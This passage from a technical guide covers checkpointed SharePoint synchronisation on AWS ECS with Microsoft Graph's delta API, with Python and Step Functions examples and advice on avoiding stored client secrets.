  "Comment": "SharePoint sync with automatic chunking",
  "StartAt": "ProcessChunk",
  "States": {
    "ProcessChunk": {
      "Type": "Task",
      "Resource": "arn:aws:ecs:...:task-definition/sharepoint-sync",
      "Next": "CheckIfComplete",
      "Catch": [{
        "ErrorEquals": ["States.ALL"],
        "Next": "SaveCheckpointAndRetry"
      }]
    },
    "CheckIfComplete": {
      "Type": "Choice",
      "Choices": [{
        "Variable": "$.status",
        "StringEquals": "completed",
        "Next": "Success"
      }],
      "Default": "WaitBeforeNextChunk"
    },
    "WaitBeforeNextChunk": {
      "Type": "Wait",
      "Seconds": 60,
      "Next": "ProcessChunk"
    },
    "Success": {
      "Type": "Succeed"
    }
  }
}
```

**Benefits**:
- Automatic retry on failure
- Built-in state management
- Execution history for debugging
- Orchestration for complex multi-stage workflows

### Special Case: Microsoft Graph Delta API

**Problem**: Delta API works differently than standard pagination.

**Delta API behavior**:
- **Delta token** = "Give me changes since last **completed** sync"
- âŒ **Cannot resume mid-sync** with delta token (you'd miss in-flight items)
- âœ… **Only use delta token** after successful completion of previous sync

**Correct checkpointing pattern for Delta API**:

```python
class SharePointDeltaSyncWorker:
    """
    SharePoint sync using Delta API with proper checkpointing.

    Key difference from standard pagination:
    - Delta token saved ONLY on successful completion
    - Checkpoint saves current batch state (not delta token)
    - Resume continues current sync, doesn't use delta token
    """

    def __init__(self):
        # ECS task role - credentials auto-refresh indefinitely
        self.credential = DefaultAzureCredential()
        self.graph_client = GraphServiceClient(
            self.credential,
            scopes=['https://graph.microsoft.com/.default']
        )
        self.dynamodb = boto3.resource('dynamodb')
        self.checkpoint_table = self.dynamodb.Table('sharepoint-sync-checkpoints')
        self.state_table = self.dynamodb.Table('sharepoint-sync-state')

    async def sync_sharepoint_site(self, site_id: str):
        """
        Sync SharePoint using Delta API with checkpointing.

        States:
        1. "not_started" - No previous sync, start fresh delta query
        2. "in_progress" - Sync running, checkpoint has pagination state
        3. "completed" - Sync finished, delta token saved for next run
        """
        # Load state (contains delta token from LAST SUCCESSFUL sync)
        state = self.load_state(site_id)
        delta_token = state.get('delta_token') if state else None

        # Load checkpoint (contains current in-progress sync state)
        checkpoint = self.load_checkpoint(site_id)

        if checkpoint and checkpoint.get('status') == 'in_progress':
            # Resume in-progress sync (DO NOT use delta token here!)
            print(f"ðŸ“ Resuming in-progress sync from checkpoint")
            print(f"   Processed: {checkpoint['total_processed']} items")
            next_link = checkpoint.get('next_link')
            total_processed = checkpoint['total_processed']
            is_resuming = True
        else:
            # Start new delta query
            if delta_token:
                print(f"ðŸ”„ Starting incremental sync (delta token from last successful sync)")
            else:
                print(f"ðŸ†• Starting initial full sync")
            next_link = None
            total_processed = 0
            is_resuming = False

        # Process delta query
        current_delta_token = None

        while True:
            try:
                # Get next page from delta query
                if is_resuming and next_link:
                    # Resume: use next_link from checkpoint
                    result = await self.get_delta_page(next_link=next_link)
                elif next_link:
                    # Continue current delta query
                    result = await self.get_delta_page(next_link=next_link)
                else:
                    # Start new delta query (with or without delta token)
                    result = await self.get_delta_page(site_id=site_id, delta_token=delta_token)

                is_resuming = False  # After first page, we're not resuming anymore

                items = result.get('value', [])
                next_link = result.get('@odata.nextLink')
                new_delta_token = result.get('@odata.deltaLink')

                # Process items
                for item in items:
                    await self.process_document(site_id, item)
                    total_processed += 1

                # Save checkpoint after each batch (with next_link, NOT delta token)
                self.save_checkpoint(site_id, {
                    'next_link': next_link,
                    'total_processed': total_processed,
                    'status': 'in_progress',
                    'last_updated': datetime.utcnow().isoformat()
                })

                print(f"Processed batch: {len(items)} items (total: {total_processed})")

                # Check if delta query complete
                if new_delta_token:
                    # Delta query completed successfully!
                    print(f"âœ… Sync complete! Processed {total_processed} items.")

                    # CRITICAL: Save delta token for NEXT sync
                    self.save_state(site_id, {
                        'delta_token': new_delta_token,
                        'last_sync_completed': datetime.utcnow().isoformat(),
                        'items_processed': total_processed
                    })

                    # Clear checkpoint (sync completed)
                    self.clear_checkpoint(site_id)

                    break

                # Continue to next page
                if not next_link:
                    # Shouldn't happen (delta query should end with deltaLink)
                    raise Exception("Delta query ended without deltaLink")

            except Exception as e:
                print(f"âŒ Error: {e}")
                # Checkpoint already saved, will resume on next run
                raise

    async def get_delta_page(self, site_id: str = None, delta_token: str = None, next_link: str = None):
        """
        Get page from delta query.

        Args:
            site_id: Start new delta query for this site
            delta_token: Delta token from previous successful sync (optional)
            next_link: Continuation link for current delta query (pagination)
        """
        if next_link:
            # Continue current delta query (pagination)
            response = await self.graph_client.get(next_link)
        elif delta_token:
            # Start incremental delta query (changes since last sync)
            response = await self.graph_client.sites[site_id].drive.root.delta(token=delta_token).get()
        else:
            # Start initial delta query (full sync)
            response = await self.graph_client.sites[site_id].drive.root.delta().get()

        return response

    def load_state(self, site_id: str) -> dict:
        """Load sync state (contains delta token from LAST SUCCESSFUL sync)."""
        try:
            response = self.state_table.get_item(Key={'site_id': site_id})
            return response.get('Item')
        except Exception:
            return None

    def save_state(self, site_id: str, state_data: dict):
        """Save sync state (delta token for next sync)."""
        self.state_table.put_item(
            Item={
                'site_id': site_id,
                **state_data
            }
        )

    def load_checkpoint(self, site_id: str) -> dict:
        """Load checkpoint (in-progress sync state)."""
        try:
            response = self.checkpoint_table.get_item(Key={'site_id': site_id})
            return response.get('Item')
        except Exception:
            return None

    def save_checkpoint(self, site_id: str, checkpoint_data: dict):
        """Save checkpoint (current sync progress)."""
        self.checkpoint_table.put_item(
            Item={
                'site_id': site_id,
                **checkpoint_data
            }
        )

    def clear_checkpoint(self, site_id: str):
        """Clear checkpoint after successful completion."""
        try:
            self.checkpoint_table.delete_item(Key={'site_id': site_id})
        except Exception:
            pass
```

**Key differences for Delta API**:

| Aspect | Standard Pagination | Delta API |
|--------|-------------------|-----------|
| **Checkpoint saves** | `continuation_token` (resume pagination) | `next_link` (resume current delta query) |
| **Delta token usage** | N/A | **Only after successful completion** |
| **Resume behavior** | Continue from continuation token | Continue current delta query, ignore delta token |
| **Completion signal** | No more pages (`continuation_token` is null) | Receive `@odata.deltaLink` instead of `@odata.nextLink` |
| **State tracking** | Single checkpoint | Checkpoint (in-progress) + State (delta token for next sync) |

**Two-table pattern**:

1. **Checkpoint table** - Tracks **current** in-progress sync
   - `next_link` - Pagination for current delta query
   - `total_processed` - Items processed so far
   - `status` - "in_progress"
   - Cleared when sync completes

2. **State table** - Tracks **last successful** sync
   - `delta_token` - For next incremental sync
   - `last_sync_completed` - Timestamp
   - Only updated on successful completion

**Flow**:
```
Initial sync:
1. No state â†’ Start fresh delta query â†’ Process all items
2. Receive @odata.deltaLink â†’ Save to state table
3. Clear checkpoint

Next sync (incremental):
1. Load delta token from state â†’ Start delta query with token
2. Process only changed items
3. Receive new @odata.deltaLink â†’ Update state table
4. Clear checkpoint

Interrupted sync:
1. Load checkpoint (has next_link) â†’ Resume current delta query
2. Continue processing â†’ Eventually get @odata.deltaLink
3. Save delta token to state â†’ Clear checkpoint
```

**Critical**: Never mix delta tokens between syncs. A delta token is valid only for the **next** sync after the sync that generated it.

---

### Best Practices for Long-Running Jobs

| Pattern | When to Use | Pros | Cons |
|---------|-------------|------|------|
| **Checkpointing in ECS** | Long-running jobs (data sync, migrations) | Resilient to failures/deployments/Spot interruptions, credentials auto-refresh indefinitely | Requires state management (DynamoDB) |
| **Delta API Checkpointing** | Microsoft Graph delta queries | Incremental syncs (only changed items), efficient | Requires two-table pattern (checkpoint + state) |
| **Step Functions** | Complex workflows, orchestration needed | Built-in state, retry logic, visual monitoring | More complex setup, additional cost |
| **Chunked Queue Processing** | Parallelizable work (thousands of independent items) | Horizontal scaling, fast completion | Requires queue infrastructure (SQS) |
| **Lambda with SQS** | Small, independent tasks (<15 min each) | Auto-scaling, no infrastructure management | 15-minute max execution time, credential limits |

### When Long-Lived Credentials Might Be Justified

**âš ï¸ Last Resort Only**:

If checkpointing is genuinely infeasible (e.g., stateful connection that can't be interrupted), consider:

1. **Azure Managed Identity** (if running on Azure infrastructure)
   - No credential expiration issues
   - Still no Client Secret storage
   - Only works if app runs on Azure

2. **Service Account with Certificate Authentication** (better than Client Secret)
   - Use certificate instead of Client Secret
   - Certificate stored in HSM/Key Vault (more secure than secret)
   - Still requires rotation, but longer-lived (1-2 years)

**But truly**: **Checkpointing is almost always the better solution** because:
- More resilient (survives failures, not just credential expiration)
- Observable (can track progress)
- Testable (can test resume logic)
- Scalable (can parallelize chunks across multiple workers)

---

## Common Patterns in POC Scripts

### Azure SharePoint Integration POC

```python
#!/usr/bin/env python3
"""
POC: Test SharePoint access using Workload Identity (no Client Secret).

Usage:
  Local: az login && python poc_sharepoint.py
  ECS: Just run (uses IAM role + Workload Identity)
"""

from azure.identity import DefaultAzureCredential
from msgraph import GraphServiceClient
import os

# Public IDs (not secrets!)
TENANT_ID = os.environ.get("AZURE_TENANT_ID", "your-tenant-id")
CLIENT_ID = os.environ.get("AZURE_CLIENT_ID", "your-client-id")


async def test_sharepoint_access():
    """Test SharePoint API access."""
    print("Testing SharePoint access...")

    # Get credential (auto-detects environment)
    credential = DefaultAzureCredential()

    # Create Graph client
    scopes = ['https://graph.microsoft.com/.default']
    graph_client = GraphServiceClient(credential, scopes)

    # Test: Get current user
    try:
        me = await graph_client.me.get()
        print(f"âœ… Authenticated as: {me.display_name} ({me.mail})")
    except Exception as e:
        print(f"âŒ Authentication failed: {e}")
        return

    # Test: List SharePoint sites
    try:
        sites = await graph_client.sites.get()
        print(f"âœ… Found {len(sites.value)} SharePoint sites")

        for site in sites.value[:3]:  # First 3 sites
            print(f"  - {site.display_name}: {site.web_url}")
    except Exception as e:
        print(f"âŒ SharePoint access failed: {e}")
        return

    print("\nâœ… POC successful! SharePoint access working.")


if __name__ == "__main__":
    import asyncio
    asyncio.run(test_sharepoint_access())
```

**Key learnings from POC**:
- Workload Identity works (no Client Secret needed)
- `DefaultAzureCredential` detects environment automatically
- Same code works locally (`az login`) and in ECS (IAM role)
- Document in design proposal: "Tested in POC, no issues"

---

## Australian English

All documentation uses **Australian English spelling**:
- âœ… organisation, authorisation, colour, behaviour, analyse
- âŒ organization, authorization, color, behavior, analyze

---

## References

**Related skills**:
- `git-workflow` - GitHub Actions implementation and CI/CD setup
- `testing` - Testing authentication flows and error scenarios

**External documentation**:
- [AWS OIDC Federation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_create_oidc.html)
- [Azure Workload Identity Federation](https://learn.microsoft.com/en-us/azure/active-directory/workload-identities/workload-identity-federation)
- [GitHub Actions OIDC](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
